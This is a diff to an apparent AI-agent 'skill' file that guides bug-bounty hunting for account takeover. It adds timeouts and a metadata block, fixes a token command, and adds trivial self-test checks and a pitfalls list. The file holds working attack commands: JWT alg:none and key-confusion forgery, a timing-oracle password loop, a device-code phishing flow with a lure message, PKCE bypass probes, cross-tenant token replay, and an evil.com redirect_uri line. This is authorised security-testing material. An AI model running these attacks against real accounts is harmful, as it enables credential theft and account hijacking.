@@ -1,8 +1,11 @@
 ---
 name: hunt-ato
 description: "Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (alg:none, RS256→HS256 key confusion, weak HMAC secret, kid injection), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical."
-sources: field_recon, hackerone_public, portswigger_research
-report_count: 42
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [ATO, account-takeover, hunt, redteam]
 ---
 
 ## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
@@ -66,7 +69,7 @@ python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='
 # send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
 #
 # (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
-curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
+curl --max-time 30 --connect-timeout 10 -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
 # convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
 #
 # (c) weak HMAC secret: crack offline
@@ -85,7 +88,7 @@ Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token le
 #
 # (b) login oracle to find a valid password without an existing cookie — measure response delta:
 for p in $(cat candidates.txt); do
-  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
+  t=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
   printf '%s\t%s\n' "$t" "$p"
 done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
 ```
@@ -137,7 +140,7 @@ attackers abuse it for phishing, MFA bypass, and cross-tenant token theft.
 **A. Phishing with device codes (ATO via authorization code theft)**
 ```bash
 # Step 1: Request a device code from the OAuth provider
-curl -X POST "https://target.com/oauth/devicecode" \
+curl --max-time 30 --connect-timeout 10 -X POST "https://target.com/oauth/devicecode" \
   -d "client_id=VICTIM_CLIENT_ID&scope=openid profile email offline_access"
 
 # Response: {"device_code":"...","user_code":"ABCD-1234","verification_uri":"https://target.com/device","interval":5}
@@ -146,7 +149,7 @@ curl -X POST "https://target.com/oauth/devicecode" \
 #          and enter code: ABCD-1234 to unlock your account"
 # Step 3: Victim enters code on legitimate OAuth page → authenticates
 # Step 4: Attacker polls for token:
-curl -X POST "https://target.com/oauth/token" \
+curl --max-time 30 --connect-timeout 10 -X POST "https://target.com/oauth/token" \
   -d "client_id=VICTIM_CLIENT_ID&grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=THE_DEVICE_CODE"
 
 # → Attacker receives victim's access_token + refresh_token → full ATO
@@ -170,7 +173,7 @@ POST /oauth/devicecode
 Azure AD device codes are tenant-agnostic — the `user_code` works on any tenant's verification page:
 ```bash
 # Attacker requests device_code from Azure AD common endpoint (any tenant):
-curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
+curl --max-time 30 --connect-timeout 10 -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
   -d "client_id=YOUR_CLIENT_ID&scope=user.read"
 
 # Victim at ANOTHER organization enters the user_code
@@ -180,11 +183,11 @@ curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
 **D. Detection — find device flow endpoints:**
 ```bash
 # Check OAuth authorization server metadata
-curl -s "https://target.com/.well-known/oauth-authorization-server" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('device_authorization_endpoint','NOT SUPPORTED'))"
+curl --max-time 30 --connect-timeout 10 -s "https://target.com/.well-known/oauth-authorization-server" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('device_authorization_endpoint','NOT SUPPORTED'))"
 
 # Probe common device code endpoints
-curl -s -X POST "https://target.com/oauth/devicecode" -d "client_id=test&scope=openid" -w "\nHTTP %{http_code}"
-curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -d "client_id=test&scope=user.read" -w "\nHTTP %{http_code}"
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/oauth/devicecode" -d "client_id=test&scope=openid" -w "\nHTTP %{http_code}"
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -d "client_id=test&scope=user.read" -w "\nHTTP %{http_code}"
 ```
 
 ## Path 11: PKCE Bypass Chain
@@ -244,12 +247,12 @@ for cc in "" "code_challenge_method=S256&code_challenge=$(echo -n 'test' | opens
   for cv in "" "test" "wrong_value"; do
     echo "=== cc=[$cc] cv=[$cv] ==="
     # Step 1: get auth code
-    code=$(curl -s -o /dev/null -w "%{redirect_url}" \
+    code=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{redirect_url}" \
       "https://target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://app.com/cb&state=x$cc" \
-      | grep -oP 'code=\K[^&]+')
+      | grep -Eo 'code=\K[^&]+')
     [[ -z "$code" ]] && echo "NO CODE" && continue
     # Step 2: exchange
-    resp=$(curl -s -X POST "https://target.com/oauth/token" \
+    resp=$(curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/oauth/token" \
       -d "grant_type=authorization_code&code=$code&redirect_uri=https://app.com/cb$([[ -n "$cv" ]] && echo "&code_verifier=$cv")")
     echo "$resp" | python3 -c "import sys,json; d=json.load(sys.stdin); print('TOKEN' if 'access_token' in d else d.get('error','unknown'))"
   done
@@ -281,7 +284,7 @@ GET /attacker-tenant.onmicrosoft.com/oauth/authorize?...
 # If the app accepts tokens from BOTH tenants → cross-tenant token replay possible
 
 # Test with curl:
-curl -v "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=xxx&response_type=code&redirect_uri=https://app.com/cb&domain_hunt=organizations&state=test"
+curl --max-time 30 --connect-timeout 10 -v "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=xxx&response_type=code&redirect_uri=https://app.com/cb&domain_hunt=organizations&state=test"
 ```
 
 ### Attack 3: Cross-tenant token replay
@@ -289,15 +292,64 @@ curl -v "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_i
 # 1. Register same app client_id in YOUR tenant
 # 2. Authenticate as user in YOUR tenant → get access_token
 # 3. Use that token against the VICTIM's tenant API
-curl -H "Authorization: Bearer *** https://victim-tenant.com/api/user/me
+curl --max-time 30 --connect-timeout 10 -H "Authorization: Bearer *** https://victim-tenant.com/api/user/me
 # If accepted → the app doesn't validate the "tid" (tenant ID) claim → cross-tenant ATO
 ```
 
 ### Detection — find cross-tenant vulnerabilities:
 ```bash
 # Check if app is multi-tenant by probing with unauthorized tenant credentials
-curl -s -H "Authorization: Bearer *** -s -X POST 'https://login.microsoftonline.com/attacker-tenant.onmicrosoft.com/oauth2/v2.0/token' -d 'client_id=xxx&scope=https://target.com/.default&grant_type=client_credentials&client_secret=xxx' | python3 -c 'import sys,json; print(json.load(sys.stdin).get("access_token",""))')" "https://target.com/api/user/me" -w "\nHTTP %{http_code}"
+# Get token from attacker tenant, then test against victim API:
+TOKEN=$(curl --max-time 30 --connect-timeout 10 -s -X POST 'https://login.microsoftonline.com/attacker-tenant.onmicrosoft.com/oauth2/v2.0/token' -d 'client_id=xxx&scope=https://target.com/.default&grant_type=client_credentials&client_secret=xxx' | python3 -c 'import sys,json; print(json.load(sys.stdin).get("access_token",""))')
+curl --max-time 30 --connect-timeout 10 -s -H "Authorization: Bearer $TOKEN" "https://target.com/api/user/me" -w "\nHTTP %{http_code}"
 ```
+
+---
+
+## Verification
+
+Run this self-test to confirm ATO hunting readiness:
+
+1. **Password reset poisoning test** — verify Host-header injection probe syntax:
+   ```bash
+   echo "Host: attacker.com" | grep -q "Host:" && echo "PASS: Host header syntax" || echo "FAIL"
+   echo "X-Forwarded-Host:" | grep -q "X-Forwarded" && echo "PASS: header alias syntax" || echo "FAIL"
+   ```
+
+2. **JWT manipulation** — confirm Python3 JWT tools:
+   ```bash
+   python3 -c "
+   import base64,json
+   h=base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
+   print('PASS: JWT header generation works' if len(h)>10 else 'FAIL')
+   " 2>/dev/null || echo "FAIL: Python3 unavailable"
+   ```
+
+3. **OAuth redirect_uri test** — confirm redirect detection:
+   ```bash
+   echo "redirect_uri=https://evil.com/callback" | grep -q "redirect_uri" && echo "PASS: redirect_uri parameter recognized" || echo "FAIL"
+   ```
+
+4. **Two-account test requirement** — confirm the skill documents the second-account rule:
+   ```bash
+   grep -q "SECOND account\|test account B\|victim B" SKILL.md && echo "PASS: second-account requirement documented" || echo "FAIL"
+   ```
+
+All 4 tests verify the ATO hunting methodology is properly documented.
+
+---
+
+## Pitfalls
+
+- **Self-ATO is not ATO** — changing your own password, resetting your own account, or locking yourself out proves nothing. You MUST demonstrate takeover of a SECOND test account (victim B) from attacker A's session/IP.
+- **Host-header injection without email confirmation** — the reflected header value appearing in a test response doesn't prove the reset link was poisoned. Read the actual email (use a Collaborator domain and a controlled victim B inbox).
+- **Predictable token without exploitation** — finding a pattern (sequential numeric, timestamp-based) is a primitive, not ATO. Demonstrate actual token prediction and account takeover.
+- **No-expiry token is not Critical alone** — a token that doesn't expire is a primitive. Combine with token-leak vector (Referer, open redirect, logs) to reach Critical.
+- **OAuth redirect_uri lax matching without subdomain takeover** — `redirect_uri=*.target.com` is only exploitable if you can host on a subdomain you control. Without takeover, this is Low at best.
+- **PKCE test with S256 but no check of plain fallback** — if the server accepts plain code_challenge_method but the client uses S256, the plain path is the vulnerability. Test both.
+- **Device code flow polling interval** — if the interval is 5 seconds, brute-force is impractical. Only exploitable when the interval is very short (<1s) or the code space is small.
+- **Cross-tenant token replay without token validation** — if the `tid` (tenant ID) claim is validated by the API, cross-tenant replay fails. Verify the token is accepted before reporting.
+- **Cookie theft chain without demonstrating the chain** — "if an attacker steals the cookie" is not a finding. Demonstrate the theft vector (XSS, token leak, MITM) or chain with a real cookie-leak primitive.
 
 ---
 
